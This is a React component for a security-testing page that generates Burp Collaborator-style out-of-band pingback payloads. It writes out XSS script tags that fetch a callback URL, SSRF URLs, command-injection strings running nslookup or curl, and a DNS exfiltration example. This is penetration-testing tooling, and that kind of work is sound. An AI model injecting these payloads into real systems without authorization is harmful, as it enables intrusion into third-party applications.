"use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Copy, ExternalLink, Shield, Zap } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"

export default function BurpIntegration() {
  const [domain, setDomain] = useState("")
  const [payload, setPayload] = useState("")
  const [testResults, setTestResults] = useState<string[]>([])

  const baseUrl = typeof window !== "undefined" ? window.location.origin : ""

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  const generatePayloads = () => {
    const subdomain = `test-${Date.now()}`
    const results = [
      // DNS Exfiltration payloads
      `nslookup ${subdomain}.${domain}`,
      `dig ${subdomain}.${domain}`,
      `host ${subdomain}.${domain}`,

      // HTTP-based DNS simulation
      `${baseUrl}/api/dns-pingback?domain=${subdomain}.${domain}&type=A`,
      `${baseUrl}/api/dns-pingback?domain=${subdomain}.${domain}&type=AAAA`,

      // Burp Collaborator style payloads
      `curl "${baseUrl}/api/pingback" -H "X-DNS-Query: ${subdomain}.${domain}"`,
      `wget "${baseUrl}/api/pingback?dns=${subdomain}.${domain}"`,

      // XSS payloads with DNS callback
      `<img src="${baseUrl}/api/pingback?xss=dns&domain=${subdomain}.${domain}">`,
      `<script>fetch('${baseUrl}/api/pingback?js=dns&domain=${subdomain}.${domain}')</script>`,

      // SSRF payloads
      `http://${baseUrl}/api/pingback?ssrf=dns&target=${subdomain}.${domain}`,

      // Command injection payloads
      `; nslookup ${subdomain}.${domain} ;`,
      `| nslookup ${subdomain}.${domain}`,
      `\`nslookup ${subdomain}.${domain}\``,
    ]
    setTestResults(results)
  }

  return (
    <main className="container mx-auto py-6 px-4 md:px-6">
      <div className="mb-6">
        <h1 className="text-3xl font-bold mb-2">Burp Collaborator Integration</h1>
        <p className="text-muted-foreground">
          Generate DNS pingback payloads for security testing, similar to Burp Collaborator
        </p>
      </div>

      <div className="grid gap-6">
        {/* Configuration */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Shield className="h-5 w-5" />
              Pingback Configuration
            </CardTitle>
            <CardDescription>Configure your pingback server for DNS and HTTP-based out-of-band testing</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid gap-4 md:grid-cols-2">
              <div>
                <Label htmlFor="domain">Your Domain (Optional)</Label>
                <Input
                  id="domain"
                  placeholder="your-domain.com"
                  value={domain}
                  onChange={(e) => setDomain(e.target.value)}
                />
                <p className="text-xs text-muted-foreground mt-1">Leave empty to use HTTP-only pingbacks</p>
              </div>
              <div>
                <Label htmlFor="payload">Custom Payload Context</Label>
                <Input
                  id="payload"
                  placeholder="xss, ssrf, rce, etc."
                  value={payload}
                  onChange={(e) => setPayload(e.target.value)}
                />
              </div>
            </div>
            <Button onClick={generatePayloads} className="w-full">
              <Zap className="h-4 w-4 mr-2" />
              Generate Pingback Payloads
            </Button>
          </CardContent>
        </Card>

        {/* Endpoints */}
        <Card>
          <CardHeader>
            <CardTitle>Available Endpoints</CardTitle>
            <CardDescription>Use these endpoints for different types of testing</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid gap-4">
              <div className="flex items-center justify-between p-3 border rounded">
                <div>
                  <code className="text-sm">{baseUrl}/api/pingback</code>
                  <p className="text-xs text-muted-foreground">General HTTP pingback</p>
                </div>
                <Button variant="outline" size="sm" onClick={() => copyToClipboard(`${baseUrl}/api/pingback`)}>
                  <Copy className="h-4 w-4" />
                </Button>
              </div>

              <div className="flex items-center justify-between p-3 border rounded">
                <div>
                  <code className="text-sm">{baseUrl}/api/dns-pingback</code>
                  <p className="text-xs text-muted-foreground">DNS-style pingback simulation</p>
                </div>
                <Button variant="outline" size="sm" onClick={() => copyToClipboard(`${baseUrl}/api/dns-pingback`)}>
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Generated Payloads */}
        {testResults.length > 0 && (
          <Card>
            <CardHeader>
              <CardTitle>Generated Payloads</CardTitle>
              <CardDescription>
                Copy these payloads for your security testing. Monitor the dashboard for incoming requests.
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {testResults.map((result, index) => (
                  <div key={index} className="flex items-center justify-between p-3 bg-muted rounded">
                    <div className="flex-1 mr-2">
                      <code className="text-sm break-all">{result}</code>
                      <div className="flex gap-1 mt-1">
                        {result.includes("nslookup") && <Badge variant="secondary">DNS</Badge>}
                        {result.includes("curl") && <Badge variant="secondary">HTTP</Badge>}
                        {result.includes("<") && <Badge variant="destructive">XSS</Badge>}
                        {result.includes("ssrf") && <Badge variant="destructive">SSRF</Badge>}
                        {result.includes(";") && <Badge variant="destructive">Injection</Badge>}
                      </div>
                    </div>
                    <Button variant="outline" size="sm" onClick={() => copyToClipboard(result)}>
                      <Copy className="h-4 w-4" />
                    </Button>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Usage Examples */}
        <Card>
          <CardHeader>
            <CardTitle>Security Testing Examples</CardTitle>
            <CardDescription>Common use cases for DNS and HTTP pingbacks in security testing</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div>
                <h4 className="font-medium mb-2">1. SSRF Detection</h4>
                <code className="text-sm bg-muted p-2 rounded block">
                  {`http://vulnerable-app.com/fetch?url=${baseUrl}/api/pingback?ssrf=test`}
                </code>
              </div>

              <div>
                <h4 className="font-medium mb-2">2. XSS with External Callback</h4>
                <code className="text-sm bg-muted p-2 rounded block">
                  {`<script>fetch('${baseUrl}/api/pingback?xss=executed')</script>`}
                </code>
              </div>

              <div>
                <h4 className="font-medium mb-2">3. Command Injection Detection</h4>
                <code className="text-sm bg-muted p-2 rounded block">
                  {`; curl ${baseUrl}/api/pingback?rce=executed ;`}
                </code>
              </div>

              <div>
                <h4 className="font-medium mb-2">4. DNS Exfiltration Simulation</h4>
                <code className="text-sm bg-muted p-2 rounded block">
                  {`${baseUrl}/api/dns-pingback?domain=exfiltrated-data.test.com&type=TXT`}
                </code>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Monitoring Instructions */}
        <Alert>
          <ExternalLink className="h-4 w-4" />
          <AlertDescription>
            <strong>Monitor your dashboard:</strong> Visit{" "}
            <a href="/" className="underline">
              the main dashboard
            </a>{" "}
            to see incoming pingback requests in real-time. All successful payloads will appear there with full details.
          </AlertDescription>
        </Alert>
      </div>
    </main>
  )
}
